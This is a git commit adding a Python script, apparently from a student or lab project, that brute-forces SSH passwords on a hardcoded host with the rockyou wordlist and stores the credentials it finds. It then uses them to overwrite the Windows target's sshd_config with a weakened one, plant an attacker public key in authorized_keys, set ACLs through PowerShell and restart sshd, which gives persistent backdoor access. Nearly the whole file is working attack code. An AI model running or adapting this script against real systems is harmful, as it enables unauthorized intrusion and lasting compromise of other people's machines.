48c2f9c24e5a57e0f4e5e217e01c83f72df6d1eb
NicholasChua <7358234+NicholasChua@users.noreply.github.com>
2023-06-09 13:20:01 +0800

    Add brute force and setup function, reorder files

---
+++ testBruteForce.py
@@ -0,0 +1,150 @@
+import csv
+import paramiko
+import sys
+from scp import SCPClient
+
+def ssh_brute_force(hostname, port, username, password_file):
+    """
+    Attempts to brute force an SSH connection given a hostname, port, username, and password list file.
+
+    Args:
+        hostname (str): The hostname or IP address of the SSH server.
+        port (int): The port number of the SSH server.
+        username (str): The username to use for the SSH connection.
+        password_file (str): The path to the password list file.
+
+    Returns:
+        bool: True if the SSH connection was successful, False otherwise.
+    """
+
+    # Create an SSH client using the Paramiko library
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    # Read from the password list file and save it to a list
+    passwordList = []
+    with open(password_file, "r") as f:
+        for line in f.readlines():
+            passwordList.append(line.strip())
+
+    # Attempt to connect to the SSH server using the username and password list
+    for password in passwordList:
+        try:
+            ssh.connect(hostname, port=port, username=username, password=password)
+            # If the connection was successful, print the valid credentials
+            print(f"[*] Found valid credentials - Username: {username}, Password: {password}")
+
+            # Write the valid credentials to credentials.csv
+            # If the file does not exist, create it and write the header
+            try:
+                with open("resources\\credentials.csv", "x") as f:
+                    f.write("username,password")
+            except FileExistsError:
+                pass
+
+            with open("credentials.csv", "a") as f:
+                f.write(f"\n{username},{password}")
+                print("[*] Wrote valid credentials to credentials.csv")
+            
+            # Close the SSH connection
+            ssh.close()
+            return True
+        except paramiko.AuthenticationException:
+            print(f"[-] Invalid credentials - Username: {username}, Password: {password}")
+        except paramiko.SSHException as e:
+            print(f"[-] Unable to establish SSH connection: {e}")
+            sys.exit(1)
+        except paramiko.ssh_exception.NoValidConnectionsError as e:
+            print(f"[-] Unable to connect to the SSH server: {e}")
+            sys.exit(1)
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            sys.exit(1)
+    
+    print("[!] Exhausted password list. Unable to find valid credentials.")
+    ssh.close()
+    return False
+
+
+def setup_ssh_config_and_key(hostname, port, credentials_path="resources\\credentials.csv", sshd_config_path="resources\\vuln_sshd_config", access_key_path="resources\\accessKey.pub"):
+    """
+    Inserts an sshd_config file and an access key into a target Windows machine. Once complete, the SSH service (sshd) is restarted.
+    After running, you will then be able to use the access key to SSH into the target machine.
+
+    Args:
+        hostname (str): The hostname or IP address of the target Windows machine.
+        port (int): The port number of the SSH server.
+        credentials_path (str): The path to the credentials file.
+        sshd_config_path (str): The path to the sshd_config file.
+        access_key_path (str): The path to the access key file.
+
+    Returns:
+        bool: True if the SSH connection was successful, False otherwise.
+    """
+
+    # Import a CSV file with credentials
+    with open(credentials_path, "r") as csv_file:
+        # Read the first line of the CSV
+            csv_reader = csv.DictReader(csv_file)
+            for credRow in csv_reader:
+                break  # Read only the first data row
+
+    # Define username and password
+    username = credRow["Username"]
+    password = credRow["Password"]
+
+    # Create SSH client
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        # Connect to the target Windows machine
+        ssh.connect(hostname, port=port, username=username, password=password)
+
+        # Create SCP client
+        scp = SCPClient(ssh.get_transport())
+
+        # Copy sshd_config to the target machine using SCP
+        scp.put(sshd_config_path, remote_path='C:/ProgramData/ssh/sshd_config')
+
+        # Copy the access key to the target machine using SCP
+        scp.put(access_key_path, remote_path=f'C:/Users/{username}/.ssh/authorized_keys')
+
+        # Close the SCP and SSH clients
+        scp.close()
+
+        # Set access rule protection and permissions on authorized_keys file using pwsh.exe
+        acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{username}\\.ssh\\EmptyFile.txt\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'
+
+        ssh.exec_command(acl_cmd)
+
+        # Restart the SSH service (sshd) using pwsh.exe
+        ssh.exec_command('pwsh.exe -Command "Restart-Service sshd"')
+
+        # Close the SSH connection
+        ssh.close()
+        
+        print("Successfully inserted sshd_config and authorized_keys.")
+        return True
+    
+    except paramiko.AuthenticationException:
+        print("Failed to authenticate to the target machine.")
+    except paramiko.SSHException as e:
+        print(f"An SSH error occurred: {e}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+    ssh.close()
+    return False
+
+if __name__ == "__main__":
+    hostname = "100.87.185.10"
+    port = 22
+    username = "itpuser"
+    password_file = "resources\\rockyou.txt"
+
+    sshd_config_path = "resources\\vuln_sshd_config"
+    access_key_path = "resources\\accessKey.pub"
+
+    ssh_brute_force(hostname, port, username, password_file)
+    setup_ssh_config_and_key(hostname, sshd_config_path, access_key_path)
